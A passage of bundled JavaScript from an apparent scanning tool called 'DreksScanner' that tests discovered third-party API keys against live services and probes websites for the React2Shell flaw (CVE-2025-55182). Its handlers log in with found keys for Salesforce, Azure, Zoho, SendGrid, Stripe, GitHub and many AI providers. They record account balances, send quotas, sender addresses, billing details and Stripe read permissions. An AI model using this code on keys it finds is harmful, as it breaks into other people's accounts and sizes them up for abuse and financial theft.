    let last = "login failed";
    for (const host of hosts) {
      const res = await this.http.post(`${host}/services/Soap/u/59.0`, {
        budget: "httpRequest",
        headers: { "content-type": "text/xml; charset=UTF-8", SOAPAction: "login" },
        body
      });
      const xml = res.text;
      const fault = xmlTag(xml, "faultstring") || xmlTag(xml, "exceptionMessage");
      if (/INVALID_LOGIN|INVALID_PASSWORD|locked|invalid username/i.test(xml + fault)) {
        return { ok: false, invalid: true, details: fault || "INVALID_LOGIN" };
      }
      const session = xmlTag(xml, "sessionId");
      if (res.status === 200 && session) {
        const server = xmlTag(xml, "serverUrl");
        const instance = server.replace(/\/services\/.*/, "") || env.SF_INSTANCE_URL || host;
        return {
          ok: true,
          info: {
            user: xmlTag(xml, "userFullName") || user,
            email: xmlTag(xml, "userEmail"),
            org: xmlTag(xml, "organizationName"),
            orgId: xmlTag(xml, "organizationId"),
            instance,
            edition: "",
            sandbox: /test\.salesforce/.test(host) ? "sandbox" : ""
          }
        };
      }
      last = fault || `HTTP ${res.status}`;
    }
    return { ok: false, invalid: false, details: last };
  }
  async oauthClient(env) {
    const hosts = [
      env.SF_LOGIN_URL?.replace(/\/+$/, ""),
      env.SF_INSTANCE_URL?.replace(/\/+$/, ""),
      "https://login.salesforce.com",
      "https://test.salesforce.com"
    ].filter((u, i, a) => !!u && /^https:\/\//i.test(u) && a.indexOf(u) === i);
    let last = "oauth failed";
    let sawInvalid = false;
    for (const host of hosts) {
      const res = await this.http.post(`${host}/services/oauth2/token`, {
        budget: "httpRequest",
        headers: { "content-type": "application/x-www-form-urlencoded", accept: "application/json" },
        body: form({
          grant_type: "client_credentials",
          client_id: env.SF_CLIENT_ID,
          client_secret: env.SF_CLIENT_SECRET
        })
      });
      const body = json4(res.text);
      const desc = body.error_description || body.error || `HTTP ${res.status}`;
      if (body.access_token) {
        const instance = (body.instance_url || env.SF_INSTANCE_URL || host).replace(/\/+$/, "");
        const info = await this.identity(body.access_token, body.id, instance) ?? {
          user: "connected-app",
          email: "",
          instance
        };
        info.instance = info.instance || instance;
        info.sandbox = /test\.salesforce/.test(host) ? "sandbox" : info.sandbox;
        if (info.orgId && instance) {
          const org = await this.orgMeta(body.access_token, instance, info.orgId);
          if (org) {
            info.org = org.name || info.org;
            info.edition = org.edition || info.edition;
            if (org.sandbox) info.sandbox = org.sandbox;
          }
        }
        return { ok: true, info };
      }
      if (/invalid_client|invalid_client_id|invalid_client_secret|invalid consumer/i.test(desc)) {
        sawInvalid = true;
        last = desc;
        continue;
      }
      last = desc;
    }
    return { ok: false, invalid: sawInvalid, details: last.slice(0, 180) };
  }
  async identity(token, idUrl, instance) {
    const urls = [idUrl, instance ? `${instance}/services/oauth2/userinfo` : ""].filter(Boolean);
    const fromUserinfo = await this.userinfo(token, instance);
    for (const url of urls) {
      try {
        const res = await this.http.get(url, {
          budget: "httpRequest",
          headers: { authorization: `Bearer ${token}`, accept: "application/json" }
        });
        if (res.status !== 200) continue;
        const body = json4(res.text);
        return {
          user: body.display_name || body.username || fromUserinfo?.user || "connected-app",
          email: body.email || fromUserinfo?.email || "",
          orgId: body.organization_id || fromUserinfo?.orgId || "",
          instance: body.urls?.custom_domain || instance || fromUserinfo?.instance
        };
      } catch {
      }
    }
    return fromUserinfo;
  }
  async orgMeta(token, instance, orgId) {
    try {
      const res = await this.http.get(
        `${instance.replace(/\/+$/, "")}/services/data/v59.0/sobjects/Organization/${encodeURIComponent(orgId)}`,
        { budget: "httpRequest", headers: { authorization: `Bearer ${token}`, accept: "application/json" } }
      );
      if (res.status !== 200) return null;
      const body = json4(res.text);
      return {
        name: body.Name || "",
        edition: body.OrganizationType || "",
        sandbox: body.IsSandbox ? `sandbox ${body.InstanceName ?? ""}`.trim() : ""
      };
    } catch {
      return null;
    }
  }
};
var AzureHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "azure";
  async validate(hit, match, siblings) {
    const env = collectAzureEnv(hit, match, siblings);
    const block = formatAzureBlock(env);
    if (!isUsableAzure(env)) return skip(this.service, "azure incomplet \u2014 skip");
    try {
      const tokenRes = await this.http.post(
        `https://login.microsoftonline.com/${env.AZURE_TENANT_ID}/oauth2/v2.0/token`,
        {
          budget: "httpRequest",
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body: form({
            client_id: env.AZURE_CLIENT_ID,
            client_secret: env.AZURE_CLIENT_SECRET,
            grant_type: "client_credentials",
            scope: "https://graph.microsoft.com/.default"
          })
        }
      );
      const tok = json4(tokenRes.text);
      if (tokenRes.status !== 200 || !tok.access_token) {
        const desc = tok.error_description || tok.error || `HTTP ${tokenRes.status}`;
        if (/AADSTS700016|AADSTS70011|AADSTS7000215|AADSTS7000222|invalid_client|unauthorized_client/i.test(desc)) {
          return { service: this.service, valid: false, details: desc.slice(0, 180), meta: { envBlock: block } };
        }
        if (tokenRes.status === 400 || tokenRes.status === 401 || tokenRes.status === 403) {
          return { service: this.service, valid: false, details: desc.slice(0, 180), meta: { envBlock: block } };
        }
        return skip(this.service, desc.slice(0, 120));
      }
      const orgRes = await this.http.get("https://graph.microsoft.com/v1.0/organization", {
        budget: "httpRequest",
        headers: { authorization: `Bearer ${tok.access_token}`, accept: "application/json" }
      });
      const orgBody = json4(orgRes.text);
      const org = orgBody.value?.[0];
      const domains = (org?.verifiedDomains ?? []).map((d) => d.name).filter((n) => !!n);
      const def = org?.verifiedDomains?.find((d) => d.isDefault)?.name;
      return {
        service: this.service,
        valid: true,
        details: `tenant ${org?.displayName || env.AZURE_TENANT_ID}`,
        meta: {
          envBlock: block,
          org: org?.displayName || "N/A",
          tenantId: org?.id || env.AZURE_TENANT_ID,
          clientId: env.AZURE_CLIENT_ID,
          domains: domains.join(", ") || def || "N/A",
          graph: orgRes.status === 200 ? "OK" : `HTTP ${orgRes.status}`
        }
      };
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
};
var ZohoHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "zoho";
  async validate(hit, match, siblings) {
    const env = collectZohoEnv(hit, match, siblings);
    if (!env.ZOHO_REFRESH_TOKEN && REFRESH_FALLBACK.test(match.value)) env.ZOHO_REFRESH_TOKEN = match.value.trim();
    const block = formatZohoBlock(env);
    if (!isUsableZoho(env)) return skip(this.service, "zoho incomplet \u2014 skip");
    try {
      let last = "token failed";
      for (const host of zohoDcHosts(env)) {
        const tokenRes = await this.http.post(
          `${host.accounts}/oauth/v2/token`,
          {
            budget: "httpRequest",
            headers: { "content-type": "application/x-www-form-urlencoded" },
            body: form({
              refresh_token: env.ZOHO_REFRESH_TOKEN,
              client_id: env.ZOHO_CLIENT_ID,
              client_secret: env.ZOHO_CLIENT_SECRET,
              grant_type: "refresh_token"
            })
          }
        );
        const tok = json4(tokenRes.text);
        if (!tok.access_token) {
          last = tok.error_description || tok.error || `HTTP ${tokenRes.status}`;
          continue;
        }
        const orgRes = await this.http.get(`${host.api}/crm/v2/org`, {
          budget: "httpRequest",
          headers: { authorization: `Zoho-oauthtoken ${tok.access_token}`, accept: "application/json" }
        });
        const userRes = await this.http.get(`${host.api}/crm/v2/users?type=CurrentUser`, {
          budget: "httpRequest",
          headers: { authorization: `Zoho-oauthtoken ${tok.access_token}`, accept: "application/json" }
        });
        const orgJson = json4(orgRes.text);
        const usersJson = json4(userRes.text);
        const org = orgJson.org?.[0];
        const user = usersJson.users?.[0];
        const license = org?.license_details;
        return {
          service: this.service,
          valid: true,
          details: `org ${org?.company_name || "N/A"}`,
          meta: {
            envBlock: block,
            token: env.ZOHO_REFRESH_TOKEN,
            org: org?.company_name || "N/A",
            email: user?.email || org?.primary_email || "N/A",
            user: user?.full_name || "N/A",
            role: user?.role?.name || "",
            country: org?.country || "",
            license: license ? `${license.paid ? "paid" : "free"} ${license.paid_type ?? ""} (${license.users_license_purchased ?? "?"} users)`.trim() : "N/A",
            dc: host.dc
          }
        };
      }
      if (/invalid_code|invalid_client|invalid_client_secret/i.test(last)) {
        return { service: this.service, valid: false, details: last.slice(0, 180), meta: { envBlock: block } };
      }
      return skip(this.service, last);
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
};
var REFRESH_FALLBACK = /\b1000\.[a-zA-Z0-9]{20,40}\.[a-zA-Z0-9]{20,40}\b/;
var MondayHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "monday";
  async validate(_hit, match) {
    const token = match.value.trim();
    if (token.length < 20) return skip(this.service, "monday token court");
    try {
      const res = await this.http.post("https://api.monday.com/v2", {
        budget: "httpRequest",
        headers: {
          authorization: token,
          "content-type": "application/json",
          accept: "application/json"
        },
        body: JSON.stringify({ query: "{ me { name email account { name id slug } } }" })
      });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}` };
      }
      const body = json4(res.text);
      if (body.errors?.length && !body.data?.me) {
        return { service: this.service, valid: false, details: body.errors[0]?.message ?? "graphql error" };
      }
      if (res.status !== 200 || !body.data?.me) {
        if (res.status >= 500) return skip(this.service, `HTTP ${res.status}`);
        return { service: this.service, valid: false, details: `HTTP ${res.status}` };
      }
      const me = body.data.me;
      return {
        service: this.service,
        valid: true,
        details: `account ${me.account?.name || "N/A"}`,
        meta: {
          org: me.account?.name || "N/A",
          user: me.name || "N/A",
          email: me.email || "N/A",
          accountId: me.account?.id || "",
          slug: me.account?.slug || ""
        }
      };
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
};
var MailtrapHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "mailtrap";
  async validate(_hit, match) {
    try {
      const res = await this.http.get("https://mailtrap.io/api/accounts", {
        budget: "httpRequest",
        headers: { "Api-Token": match.value, accept: "application/json" }
      });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}` };
      }
      if (res.status !== 200) return skip(this.service, `HTTP ${res.status}`);
      const accounts = json4(res.text);
      const names = (Array.isArray(accounts) ? accounts : []).map((a) => a.name).filter((n) => !!n);
      return {
        service: this.service,
        valid: true,
        details: `${names.length} account(s)`,
        meta: { org: names[0] || "N/A", accounts: names.join(", ") || "N/A" }
      };
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
};
var ElasticEmailHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "elasticemail";
  async validate(_hit, match) {
    try {
      const res = await this.http.get("https://api.elasticemail.com/v4/account", {
        budget: "httpRequest",
        headers: { "X-ElasticEmail-ApiKey": match.value, accept: "application/json" }
      });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}` };
      }
      if (res.status !== 200) return skip(this.service, `HTTP ${res.status}`);
      const acc = json4(res.text);
      return {
        service: this.service,
        valid: true,
        details: acc.Email || "account ok",
        meta: {
          email: acc.Email || "N/A",
          org: acc.Company || "N/A",
          reputation: String(acc.Reputation ?? "N/A"),
          dailyLimit: String(acc.DailySendLimit ?? "N/A")
        }
      };
    } catch (err) {
      return netSkip(this.service, err);
    }
  }
};

// packages/validator/src/ai-models.ts
var MODEL_LIST_CAP = 40;
function parseModelIds(text) {
  let body;
  try {
    body = JSON.parse(text);
  } catch {
    return [];
  }
  if (!body || typeof body !== "object") return [];
  const rec = body;
  const buckets = [];
  if (Array.isArray(rec.data)) buckets.push(...rec.data);
  if (Array.isArray(rec.models)) buckets.push(...rec.models);
  if (Array.isArray(rec.items)) buckets.push(...rec.items);
  const ids = [];
  const seen = /* @__PURE__ */ new Set();
  for (const item of buckets) {
    let id = "";
    if (typeof item === "string") id = item;
    else if (item && typeof item === "object") {
      const o = item;
      const raw = o.id ?? o.name ?? o.model ?? o.slug;
      if (typeof raw === "string") id = raw;
    }
    id = id.trim();
    if (!id || seen.has(id)) continue;
    seen.add(id);
    ids.push(id);
  }
  return ids;
}
function modelsMeta(ids) {
  return {
    modelCount: String(ids.length),
    models: ids.slice(0, MODEL_LIST_CAP).join("\n")
  };
}

// packages/validator/src/ai-handler.ts
function json5(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
function skip2(service, details) {
  return { service, valid: false, raw: true, details, meta: { skipNotify: "1" } };
}
function replicateToken(raw) {
  const key = String(raw ?? "").trim().replace(/^["']|["']$/g, "");
  if (key.startsWith("r8_") && key.length > 40) return key.slice(0, 40);
  return key;
}
function orgFrom(siblings) {
  return siblings.find((s) => /^org-[A-Za-z0-9]{8,}$/.test(s.value.trim()))?.value.trim() ?? "";
}
var SPECS = [
  {
    service: "openai",
    key: (raw, siblings) => {
      const k = siblings.find((s) => s.value.startsWith("sk-"))?.value ?? raw;
      return k.startsWith("sk-") ? k : null;
    },
    headers: (key, siblings) => {
      const h = { authorization: `Bearer ${key}` };
      const org = orgFrom(siblings);
      if (org) h["openai-organization"] = org;
      return h;
    },
    check: "https://api.openai.com/v1/models",
    extras: [
      "https://api.openai.com/v1/dashboard/billing/subscription",
      "https://api.openai.com/v1/dashboard/billing/credit_grants",
      "https://api.openai.com/v1/organization"
    ]
  },
  {
    service: "anthropic",
    key: (raw) => raw.startsWith("sk-ant-") ? raw : null,
    headers: (key) => ({ "x-api-key": key, "anthropic-version": "2023-06-01" }),
    check: "https://api.anthropic.com/v1/models"
  },
  {
    service: "groq",
    key: (raw) => raw.startsWith("gsk_") ? raw : raw.length > 20 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.groq.com/openai/v1/models"
  },
  {
    service: "huggingface",
    key: (raw) => raw.startsWith("hf_") ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://huggingface.co/api/whoami-v2"
  },
  {
    service: "openrouter",
    key: (raw) => raw.startsWith("sk-or-") || raw.length > 20 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://openrouter.ai/api/v1/models",
    extras: ["https://openrouter.ai/api/v1/key"]
  },
  {
    service: "perplexity",
    key: (raw) => raw.startsWith("pplx-") || raw.length > 20 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.perplexity.ai/models"
  },
  {
    service: "xai",
    key: (raw) => raw.startsWith("xai-") ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.x.ai/v1/models",
    extras: ["https://api.x.ai/v1/api-key"]
  },
  {
    service: "mistral",
    key: (raw) => raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.mistral.ai/v1/models"
  },
  {
    service: "together",
    key: (raw) => raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.together.xyz/v1/models"
  },
  {
    service: "fireworks",
    key: (raw) => raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.fireworks.ai/inference/v1/models"
  },
  {
    service: "deepseek",
    key: (raw) => raw.startsWith("sk-") || raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.deepseek.com/models",
    extras: ["https://api.deepseek.com/user/balance"]
  },
  {
    service: "cohere",
    key: (raw) => raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.cohere.com/v1/models",
    extras: ["https://api.cohere.com/v1/check-api-key"]
  },
  {
    service: "voyage",
    key: (raw) => raw.startsWith("pa-") || raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.voyageai.com/v1/models"
  },
  {
    service: "replicate",
    key: (raw) => {
      const k = replicateToken(raw);
      return k.startsWith("r8_") ? k : k.length > 16 ? k : null;
    },
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://api.replicate.com/v1/account"
  },
  {
    service: "nvidia",
    key: (raw) => raw.startsWith("nvapi-") || raw.length > 16 ? raw : null,
    headers: (key) => ({ authorization: `Bearer ${key}` }),
    check: "https://integrate.api.nvidia.com/v1/models"
  }
];
var AiHandler = class {
  constructor(http, spec) {
    this.http = http;
    this.spec = spec;
    this.service = spec.service;
  }
  http;
  spec;
  service;
  async validate(hit, match, siblings) {
    const key = this.spec.key(match.value, [match, ...siblings, ...orgMatches(hit)]);
    if (!key) return skip2(this.service, "cl\xE9 incompl\xE8te / format non testable");
    const headers = this.spec.headers(key, [match, ...siblings, ...orgMatches(hit)]);
    try {
      const res = await this.http.get(this.spec.check, { budget: "httpRequest", headers });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      if (res.status !== 200 && res.status !== 201) {
        return { service: this.service, valid: false, raw: true, details: `HTTP ${res.status}` };
      }
      const meta = {
        ...parseCheck(this.service, this.spec.check, res.text)
      };
      for (const url of this.spec.extras ?? []) {
        try {
          const extra = url.includes("check-api-key") ? await this.http.post(url, {
            budget: "httpRequest",
            headers: { ...headers, "content-type": "application/json" },
            body: JSON.stringify({ api_key: key })
          }) : await this.http.get(url, { budget: "httpRequest", headers });
          if (extra.status === 200 || extra.status === 201) {
            Object.assign(meta, parseExtra(this.service, url, extra.text));
          }
        } catch {
        }
      }
      const n = meta.modelCount ? `${meta.modelCount} mod\xE8le(s)` : meta.identity || "ok";
      return { service: this.service, valid: true, details: n, meta };
    } catch (err) {
      return { service: this.service, valid: false, details: "request failed", error: err.message };
    }
  }
};
function orgMatches(hit) {
  const blob2 = hit.contentSnippet ?? "";
  const m = blob2.match(/\borg-[A-Za-z0-9]{8,}\b/);
  if (!m) return [];
  return [{ service: "openai", value: m[0], context: blob2, lineNumber: 0, patternName: "org" }];
}
function parseCheck(service, url, text) {
  if (service === "huggingface") return parseHuggingFace(text);
  if (service === "replicate") return parseReplicate(text);
  if (/\/models(?:\?|$)/i.test(url) || /\/models$/i.test(url)) {
    return modelsMeta(parseModelIds(text));
  }
  return {};
}
function parseExtra(service, url, text) {
  const body = json5(text);
  if (service === "openai") {
    if (url.includes("subscription")) {
      const plan = body.plan ?? {};
      const out = {};
      const title = plan.title || plan.id;
      if (title) out.plan = String(title);
      if (body.hard_limit_usd != null) out.quota = `${body.hard_limit_usd} USD`;
      if (body.has_payment_method != null) out.accountType = body.has_payment_method ? "paid" : "no-card";
      return out;
    }
    if (url.includes("credit_grants")) {
      const avail = body.total_available ?? body.total_granted;
      const used = body.total_used;
      if (avail == null && used == null) return {};
      return { balance: `${used ?? "?"}/${avail ?? "?"} USD` };
    }
    if (url.includes("organization")) {
      const name = body.name ?? body.title ?? body.organization?.name;
      if (name) return { org: String(name) };
    }
  }
  if (service === "openrouter") {
    const data = body.data ?? body;
    const out = {};
    if (data.label) out.identity = data.label;
    if (data.is_free_tier != null) out.accountType = data.is_free_tier ? "free" : "paid";
    if (data.usage != null || data.limit != null) {
      out.usage = `${data.usage ?? 0}${data.limit != null ? ` / ${data.limit}` : ""}`;
    }
    if (data.limit_remaining != null) out.balance = String(data.limit_remaining);
    return out;
  }
  if (service === "xai" && url.includes("api-key")) {
    const out = {};
    if (typeof body.name === "string") out.identity = body.name;
    if (typeof body.team_id === "string") out.org = body.team_id;
    if (body.blocked != null) out.accountType = body.blocked ? "blocked" : "active";
    return out;
  }
  if (service === "deepseek" && url.includes("balance")) {
    const infos = body.balance_infos;
    const first = infos?.[0];
    if (first) return { balance: `${first.total_balance ?? "?"} ${first.currency ?? ""}`.trim() };
  }
  if (service === "cohere" && url.includes("check-api-key")) {
    if (typeof body.organization_id === "string") return { org: body.organization_id };
  }
  return {};
}
function parseHuggingFace(text) {
  const acc = json5(text);
  const orgs = (acc.orgs ?? []).map((o) => o.name).filter((n) => !!n);
  const out = {
    identity: acc.name || acc.fullname || "",
    accountType: acc.type || acc.auth?.accessToken?.role || ""
  };
  if (acc.email) out.email = acc.email;
  if (acc.plan) out.plan = acc.plan;
  if (orgs.length) out.org = orgs.join(", ");
  if (acc.canPay != null) out.quota = acc.canPay ? "canPay" : "no-pay";
  return out;
}
function parseReplicate(text) {
  const acc = json5(text);
  return {
    identity: acc.username || acc.name || "",
    accountType: acc.type ?? ""
  };
}
function aiHandlers(http) {
  return SPECS.map((spec) => new AiHandler(http, spec));
}

// packages/validator/src/react2shell.ts
init_src();
var CVE_REACT2SHELL = "CVE-2025-55182";
var BOUNDARY = "----DreksR2S8f3a1c9";
var NEXT_ACTION_ID = "r2s-probe";
var RSD_VERSION = /react-server-dom-(webpack|turbopack|esm)[@/]v?(\d+\.\d+\.\d+)/i;
var RSD_CRASH = /Cannot read properties of undefined \(reading ['"]?(?:call|then|apply|bind|id)['"]?\)/i;
function isVulnerableReactServerDom(version) {
  const m = version.trim().match(/^(\d+)\.(\d+)\.(\d+)/);
  if (!m) return false;
  const maj = Number(m[1]);
  const min = Number(m[2]);
  const patch = Number(m[3]);
  if (maj < 19) return true;
  if (maj > 19) return false;
  if (min === 0) return patch < 1;
  if (min === 1) return patch < 2;
  if (min === 2) return patch < 1;
  return false;
}
function classifyReact2Shell(status, body) {
  if (status !== 500) {
    return { verdict: "inconclusive", evidence: `HTTP ${status} \u2014 pas d'erreur Flight` };
  }
  const vm = RSD_VERSION.exec(body);
  if (vm) {
    const flavor = (vm[1] ?? "webpack").toLowerCase();
    const version = vm[2] ?? "";
    const verdict = isVulnerableReactServerDom(version) ? "vulnerable" : "patched";
    return { verdict, version, flavor, evidence: vm[0] };
  }
  if (/react-server-dom/i.test(body) && RSD_CRASH.test(body)) {
    return { verdict: "vulnerable", evidence: "crash signature (Cannot read properties of undefined)" };
  }
  return { verdict: "inconclusive", evidence: "500 sans fuite de version react-server-dom" };
}
function buildReact2ShellProbe(url, actionId = NEXT_ACTION_ID) {
  const target = probeUrl(url);
  const body = [
    `--${BOUNDARY}`,
    `Content-Disposition: form-data; name="$ACTION_REF_0"`,
    "",
    '["", null]',
    `--${BOUNDARY}--`,
    ""
  ].join("\r\n");
  return {
    url: target,
    headers: {
      "content-type": `multipart/form-data; boundary=${BOUNDARY}`,
      "next-action": actionId
    },
    body
  };
}
function probeUrl(raw) {
  try {
    const u = new URL(raw);
    if (!u.pathname || u.pathname === "/") return `${u.origin}/`;
    return u.href;
  } catch {
    return raw;
  }
}
var React2ShellHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "react2shell";
  async validate(hit, match) {
    const origin = match.value?.trim() || hit.origin;
    const marker = (match.context || hit.contentSnippet || "").slice(0, 200);
    try {
      const actionId = hit.extra?.nextActionId || await this.lookupActionId(origin, hit.url) || NEXT_ACTION_ID;
      const probe = buildReact2ShellProbe(origin, actionId);
      const res = await this.http.post(probe.url, {
        budget: "httpRequest",
        headers: probe.headers,
        body: probe.body
      });
      const c = classifyReact2Shell(res.status, res.text);
      const baseMeta = {
        cve: CVE_REACT2SHELL,
        version: c.version ?? "N/A",
        flavor: c.flavor ?? "N/A",
        evidence: c.evidence ?? "",
        ...marker ? { marker } : {}
      };
      if (c.verdict === "vulnerable") {
        return {
          service: this.service,
          valid: true,
          details: `react-server-dom-${c.flavor ?? "?"}@${c.version ?? "?"} \u2014 VULN\xC9RABLE`,
          meta: { ...baseMeta, statusKind: "vulnerable" }
        };
      }
      if (c.verdict === "patched") {
        return {
          service: this.service,
          valid: false,
          details: `react-server-dom-${c.flavor}@${c.version} \u2014 patch\xE9 (non vuln\xE9rable)`,
          meta: { ...baseMeta, statusKind: "patched" }
        };
      }
      return {
        service: this.service,
        valid: false,
        raw: true,
        details: c.evidence ?? "probe inconclusif",
        meta: { skipNotify: "1" }
      };
    } catch (err) {
      return {
        service: this.service,
        valid: false,
        raw: true,
        details: "request failed",
        error: err.message,
        meta: { skipNotify: "1" }
      };
    }
  }
  /** Récupère un ID d'action réel depuis la page si l'engine n'en a pas fourni. */
  async lookupActionId(origin, pageUrl) {
    try {
      const target = pageUrl && /^https?:\/\//i.test(pageUrl) ? pageUrl : `${origin}/`;
      const res = await this.http.get(target, { budget: "pathProbe" });
      if (res.status < 200 || res.status >= 400 || !res.text) return void 0;
      return extractNextActionIds(res.text)[0];
    } catch {
      return void 0;
    }
  }
};

// packages/validator/src/handlers.ts
function json6(text) {
  try {
    return JSON.parse(text);
  } catch {
    return {};
  }
}
var SendGridHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "sendgrid";
  async validate(_hit, match) {
    if (!isFullSendGridKey(match.value)) {
      return { service: "sendgrid", valid: false, details: "cl\xE9 SendGrid incompl\xE8te (len \u2260 69)" };
    }
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const acct = await this.http.get("https://api.sendgrid.com/v3/user/account", {
        budget: "httpRequest",
        headers
      });
      if (acct.status === 400 || acct.status === 401 || acct.status === 403 || acct.status !== 200 && acct.status < 500) {
        return { service: "sendgrid", valid: false, details: `HTTP ${acct.status}`, error: acct.text.slice(0, 120) };
      }
      if (acct.status !== 200) {
        return { service: "sendgrid", valid: false, raw: true, details: `HTTP ${acct.status}` };
      }
      const account = json6(acct.text);
      const res = await this.http.get("https://api.sendgrid.com/v3/user/credits", {
        budget: "httpRequest",
        headers
      });
      const credits = json6(res.text);
      const used = Number(credits.used ?? 0);
      const total = Number(credits.total ?? 0);
      const remain = Number(credits.remain ?? Math.max(0, total - used));
      const from = await this.senders(headers);
      const quota = res.status === 200 ? `${used} used / ${total} total (${remain} remaining)` : "N/A";
      return {
        service: "sendgrid",
        valid: true,
        details: `Type: ${account.type ?? "unknown"} | Quota: ${quota}`,
        meta: {
          accountType: String(account.type ?? "unknown"),
          quota,
          from: from || "Aucun",
          smtp: "Disponible"
        }
      };
    } catch (err) {
      return { service: "sendgrid", valid: false, error: err.message, details: "request failed" };
    }
  }
  async senders(headers) {
    const emails = /* @__PURE__ */ new Set();
    try {
      const res = await this.http.get("https://api.sendgrid.com/v3/verified_senders", { budget: "httpRequest", headers });
      const body = json6(res.text);
      for (const r of body.results ?? []) if (r.from_email) emails.add(r.from_email);
    } catch {
    }
    try {
      const res = await this.http.get("https://api.sendgrid.com/v3/user/email", { budget: "httpRequest", headers });
      const body = json6(res.text);
      if (body.email) emails.add(body.email);
    } catch {
    }
    return [...emails].join(", ");
  }
};
var StripeHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "stripe";
  async validate(_hit, match, siblings) {
    const secret = [match, ...siblings].find((s) => isStripeSecret(s.value))?.value ?? "";
    const pub = [match, ...siblings].find((s) => s.value.startsWith("pk_"))?.value ?? "";
    if (!secret) {
      return {
        service: "stripe",
        valid: false,
        raw: true,
        details: "pk without sk \u2014 skip",
        meta: { skipNotify: "1" }
      };
    }
    const headers = { authorization: `Bearer ${secret}` };
    try {
      const res = await this.http.get("https://api.stripe.com/v1/balance", { budget: "httpRequest", headers });
      if (res.status !== 200) {
        return { service: "stripe", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      const bal = json6(res.text);
      const avail = bal.available?.[0];
      const amount = avail ? (avail.amount / 100).toFixed(2) : "0.00";
      const currency = (avail?.currency ?? "usd").toUpperCase();
      let company = "N/A";
      let country = "N/A";
      try {
        const acc = await this.http.get("https://api.stripe.com/v1/account", { budget: "httpRequest", headers });
        if (acc.status === 200) {
          const a = json6(acc.text);
          country = a.country ?? "N/A";
          company = a.business_profile?.name || a.settings?.dashboard?.display_name || "N/A";
        }
      } catch {
      }
      const isTestKey = secret.startsWith("sk_test_") || secret.startsWith("rk_test_");
      const permBlock = await this.permissions(headers);
      return {
        service: "stripe",
        valid: !isTestKey,
        details: isTestKey ? "Cl\xE9 de test Stripe (sk_test_)" : `balance ${amount} ${currency}`,
        meta: {
          publicKey: pub,
          company,
          country,
          balance: `${amount} ${currency}`,
          permBlock,
          ...isTestKey ? { statusKind: "test-key", testKey: "1" } : {}
        }
      };
    } catch (err) {
      return { service: "stripe", valid: false, details: "request failed", error: err.message };
    }
  }
  async permissions(headers) {
    const probes = [
      { name: "balance_read", path: "/v1/balance" },
      { name: "charges_read", path: "/v1/charges?limit=1" },
      { name: "customers_read", path: "/v1/customers?limit=1" },
      { name: "payment_intents_read", path: "/v1/payment_intents?limit=1" },
      { name: "payment_methods_read", path: "/v1/payment_methods?limit=1&type=card" },
      { name: "products_read", path: "/v1/products?limit=1" },
      { name: "prices_read", path: "/v1/prices?limit=1" },
      { name: "subscriptions_read", path: "/v1/subscriptions?limit=1" },
      { name: "invoices_read", path: "/v1/invoices?limit=1" },
      { name: "refunds_read", path: "/v1/refunds?limit=1" },
      { name: "payouts_read", path: "/v1/payouts?limit=1" },
      { name: "transfers_read", path: "/v1/transfers?limit=1" },
      { name: "checkout_sessions_read", path: "/v1/checkout/sessions?limit=1" },
      { name: "files_read", path: "/v1/files?limit=1" }
    ];
    const lines = [];
    for (const p of probes) {
      try {
        const res = await this.http.get(`https://api.stripe.com${p.path}`, { budget: "httpRequest", headers });
        if (res.status === 200) lines.push(`\u2705 ${p.name}`);
        else if (res.status === 403) lines.push(`\u274C ${p.name}`);
        else if (res.status === 401) break;
        else lines.push(`\u26A0\uFE0F ${p.name} (HTTP ${res.status})`);
      } catch {
        lines.push(`\u26A0\uFE0F ${p.name} (erreur)`);
      }
    }
    return lines.join("\n");
  }
};
function githubAuthHeaders(token, scheme) {
  return {
    authorization: `${scheme} ${token}`,
    accept: "application/vnd.github.v3+json",
    "x-github-api-version": "2022-11-28",
    "user-agent": "DreksScanner"
  };
}
function parseGithubUser(text) {
  const parsed = json6(text);
  if (parsed.login?.trim()) return parsed;
  const login = text.match(/"login"\s*:\s*"([^"]+)"/)?.[1];
  if (login) return { ...parsed, login };
  return parsed;
}
var GitHubHandler = class {
  constructor(http) {
    this.http = http;
  }
  http;
  service = "github";
  async validate(hit, match) {
    const token = match.value.trim();
    let last = "request failed";
    for (const scheme of ["Bearer", "token"]) {
      const tried = await this.probe(token, scheme, hit);
      if (tried) return tried;
